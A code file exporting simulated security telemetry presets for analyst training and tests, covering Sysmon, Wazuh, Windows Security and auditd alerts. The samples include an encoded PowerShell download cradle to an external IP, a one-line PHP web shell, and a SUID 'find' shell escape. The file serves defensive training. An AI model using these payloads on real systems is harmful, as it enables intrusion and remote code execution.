/**
 * Realistic Enterprise Security Telemetry Presets
 * Used for instant triage demonstrations, test suites, and analyst training.
 */

export const TELEMETRY_PRESETS = [
  {
    id: 'sysmon_cobalt_strike',
    name: 'Sysmon Event ID 1: Cobalt Strike / Encoded PowerShell',
    category: 'Windows Sysmon / EDR',
    description: 'Process creation alert with high-entropy base64 PowerShell, LOLBin staging, and outbound C2 connection parameter.',
    telemetry: `Event[1]:
  Log Name: Microsoft-Windows-Sysmon/Operational
  Source: Microsoft-Windows-Sysmon
  Date: 2026-10-14T08:44:12.1942010Z
  Event ID: 1
  Task: Process Create (rule: ProcessCreate)
  Level: Information
  Opcode: Info
  Keyword: 0x8000000000000000
  User: NT AUTHORITY\\SYSTEM
  Computer: FIN-SRV-04.corp.acme.local
Description:
  UtcTime: 2026-10-14 08:44:11.890
  ProcessGuid: {a1b2c3d4-e5f6-7890-abcd-ef0123456789}
  ProcessId: 4892
  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  FileVersion: 10.0.19041.1
  Description: Windows PowerShell
  Product: Microsoft Windows Operating System
  Company: Microsoft Corporation
  OriginalFileName: PowerShell.EXE
  CommandLine: "powershell.exe" -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQA6ADgAMAA4ADAvAG4AZQB3AHMALgBwAHMAMQAnACkA
  CurrentDirectory: C:\\Windows\\Temp\\
  User: CORP\\fin_svc_admin
  LogonGuid: {12345678-1234-1234-1234-1234567890ab}
  LogonId: 0x3e7
  TerminalSessionId: 1
  IntegrityLevel: High
  Hashes: SHA256=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08,MD5=2a7a58a74e5b98f3b7d142b47e24a873
  ParentProcessGuid: {09876543-4321-4321-4321-ba0987654321}
  ParentProcessId: 3120
  ParentImage: C:\\Windows\\System32\\cmd.exe
  ParentCommandLine: "cmd.exe" /c C:\\Users\\Public\\stage.bat
  ParentUser: CORP\\fin_svc_admin`
  },
  {
    id: 'wazuh_fim_webshell',
    name: 'Wazuh Alert: Web Shell (China Chopper) & FIM Modification',
    category: 'Wazuh SIEM / FIM',
    description: 'Wazuh JSON alert indicating file creation in web root followed by PHP execution with system calls.',
    telemetry: `{
  "timestamp": "2026-10-14T07:15:22.408+0000",
  "rule": {
    "level": 12,
    "description": "File added to web server directory with executable PHP extension - Potential Web Shell",
    "id": "100234",
    "mitre": {
      "id": ["T1505.003", "T1059.004"],
      "tactic": ["Persistence", "Execution"],
      "technique": ["Web Shell", "Unix Shell"]
    },
    "groups": ["syscheck", "fim", "web_threat"]
  },
  "agent": {
    "id": "004",
    "name": "dmz-web-prod01",
    "ip": "172.16.10.88"
  },
  "manager": {
    "name": "wazuh-master"
  },
  "syscheck": {
    "path": "/var/www/html/uploads/helpdesk_attachment.php",
    "sha256_after": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "md5_after": "d41d8cd98f00b204e9800998ecf8427e",
    "size_after": 248,
    "perm_after": "rw-r--r--",
    "uid_after": "33",
    "gid_after": "33",
    "uname_after": "www-data",
    "gname_after": "www-data",
    "event": "added",
    "file_content_snippet": "<?php /* simulated web shell */ @eval($_POST['cmd']); system($_GET['c']); ?>"
  },
  "location": "syscheck",
  "client_ip": "194.26.29.112"
}`
  },
  {
    id: 'kerberoasting_psexec',
    name: 'Windows Event 4769 / 4624: Kerberoasting & PsExec Lateral Movement',
    category: 'Active Directory / Windows Security',
    description: 'Kerberos service ticket request with RC4 encryption (Ticket Encryption Type: 0x17) and PsExec remote service creation.',
    telemetry: `Log Name: Security
Source: Microsoft-Windows-Security-Auditing
Date: 2026-10-14T06:12:05.120Z
Event ID: 4769
Task Category: Kerberos Service Ticket Operations
Level: Information
Keywords: Audit Success
User: N/A
Computer: DC01.corp.acme.local
Description:
A Kerberos service ticket was requested.

Account Information:
  Account Name: jdoe@CORP.ACME.LOCAL
  Account Domain: CORP.ACME.LOCAL
  Logon GUID: {67c793f1-d007-42cf-8cf0-354da27a51d9}

Service Information:
  Service Name: MSSQLSvc/db-prod.corp.acme.local:1433
  Service ID: S-1-5-21-293847293-192837492-918273645-1105

Network Information:
  Client Address: ::ffff:10.200.5.42
  Client Port: 52184

Additional Information:
  Ticket Options: 0x40810000
  Ticket Encryption Type: 0x17
  Ticket Encryption Name: RSADSI RC4-HMAC(NT)
  Failure Code: 0x0

--- Correlated Event ID 7045 (FIN-SRV-02): ---
Service Name: PSEXESVC
Service File Name: %SystemRoot%\\PSEXESVC.exe
Service Type: user mode service
Service Start Type: demand start
Service Account: LocalSystem`
  },
  {
    id: 'linux_auditd_dirty_cow',
    name: 'Linux Auditd: SUID Binary Abuse / Root Privilege Escalation',
    category: 'Linux Auditd / Host Intrusion',
    description: 'Auditd syscall log showing unauthorized privilege escalation via vulnerable SUID binary and /etc/passwd modification.',
    telemetry: `type=SYSCALL msg=audit(1728892100.812:4102): arch=c000003e syscall=59 success=yes exit=0 a0=55d28b120 a1=55d28b150 a2=55d28b190 a3=7ffd4180 items=2 ppid=1820 pid=2491 auid=1001 uid=1001 gid=1001 euid=0 suid=0 fsuid=0 tty=pts1 ses=3 comm="find" exe="/usr/bin/find" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="priv_esc"
type=EXECVE msg=audit(1728892100.812:4102): argc=4 a0="/usr/bin/find" a1="." a2="-exec" a3="/bin/sh -p ;"
type=CWD msg=audit(1728892100.812:4102): cwd="/tmp/.exploit"
type=PATH msg=audit(1728892100.812:4102): item=0 name="/usr/bin/find" inode=262157 dev=08:01 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
type=PATH msg=audit(1728892100.812:4102): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=262145 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL`
  }
];